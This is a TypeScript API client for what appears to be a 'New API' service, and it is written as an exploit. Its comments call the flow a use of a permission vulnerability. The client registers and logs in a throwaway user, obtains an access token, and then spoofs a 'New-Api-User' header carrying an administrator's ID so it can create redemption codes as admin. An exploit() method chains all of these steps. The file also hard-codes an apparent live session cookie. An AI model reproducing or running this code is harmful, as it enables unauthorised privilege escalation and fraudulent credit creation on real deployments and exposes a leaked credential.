import axios, { AxiosInstance } from 'axios'
import type {
  NewApiConfig,
  RegisterRequest,
  LoginRequest,
  LoginResponse,
  TokenResponse,
  RedemptionRequest,
  RedemptionResponse,
} from './types'

export class NewApiClient {
  private client: AxiosInstance
  private cookies: string = 'session=MTc2NjU4MTUzMnxEWDhFQVFMX2dBQUJFQUVRQUFEX2tfLUFBQVVHYzNSeWFXNW5EQWNBQldkeWIzVndCbk4wY21sdVp3d09BQXhqYkdGMVpHWGt1SlBubEtnR2MzUnlhVzVuREFRQUFtbGtBMmx1ZEFRREFQLUtCbk4wY21sdVp3d0tBQWgxYzJWeWJtRnRaUVp6ZEhKcGJtY01CZ0FFTVRBek53WnpkSEpwYm1jTUJnQUVjbTlzWlFOcGJuUUVBZ0FDQm5OMGNtbHVad3dJQUFaemRHRjBkWE1EYVc1MEJBSUFBZz09fBxvImp0zl3OJAcixZ6C7Dhj-e7ISfEhduTyYKqhz4RS'
  private accessToken: string = ''

  constructor(config: NewApiConfig) {
    this.client = axios.create({
      baseURL: config.baseURL,
      timeout: config.timeout || 30000,
      headers: {
        'Content-Type': 'application/json',
      },
    })

    // 响应拦截器：保存 cookies
    this.client.interceptors.response.use((response) => {
      const setCookie = response.headers['set-cookie']
      if (setCookie) {
        this.cookies = setCookie.join('; ')
      }
      return response
    })
  }

  /**
   * 注册新用户
   */
  async register(data: RegisterRequest): Promise<LoginResponse> {
    const response = await this.client.post<LoginResponse>('/api/user/register', data)
    return response.data
  }

  /**
   * 用户登录
   */
  async login(data: LoginRequest): Promise<LoginResponse> {
    const response = await this.client.post<LoginResponse>('/api/user/login', data, {
      headers: this.cookies ? { Cookie: this.cookies } : {},
    })
    return response.data
  }

  /**
   * 生成 Access Token
   */
  async generateAccessToken(): Promise<string> {
    const response = await this.client.get<TokenResponse>('/api/user/token', {
      headers: this.cookies ? { Cookie: this.cookies } : {},
    })

    if (response.data.success && response.data.data) {
      this.accessToken = response.data.data
      return this.accessToken
    }

    throw new Error(response.data.message || '生成 Token 失败')
  }

  /**
   * 创建兑换码（利用权限漏洞）
   * @param adminId 管理员用户 ID
   * @param data 兑换码数据
   */
  async createRedemption(adminId: number, data: RedemptionRequest): Promise<string[]> {
    if (!this.accessToken) {
      throw new Error('请先调用 generateAccessToken() 获取 token')
    }

    const response = await this.client.post<RedemptionResponse>('/api/redemption/', data, {
      headers: {
        Authorization: `Bearer ${this.accessToken}`,
        'New-Api-User': adminId.toString(),
      },
    })

    if (response.data.success && response.data.data) {
      return response.data.data
    }

    throw new Error(response.data.message || '创建兑换码失败')
  }

  /**
   * 一键获取 Token（注册 + 登录 + 生成 Token）
   */
  async quickGetToken(username: string, password: string): Promise<string> {
    // 1. 注册
    await this.register({ username, password })

    // 2. 登录
    await this.login({ username, password })

    // 3. 生成 Token
    return await this.generateAccessToken()
  }

  /**
   * 完整利用流程：注册 -> 登录 -> 获取 Token -> 创建兑换码
   */
  async exploit(
    username: string,
    password: string,
    adminId: number,
    redemption: RedemptionRequest,
  ): Promise<string[]> {
    // 1. 获取 Token
    await this.quickGetToken(username, password)

    // 2. 利用漏洞创建兑换码
    return await this.createRedemption(adminId, redemption)
  }

  /**
   * 获取当前 Access Token
   */
  getAccessToken(): string {
    return this.accessToken
  }

  /**
   * 设置 Access Token（如果已有）
   */
  setAccessToken(token: string): void {
    this.accessToken = token
  }
}
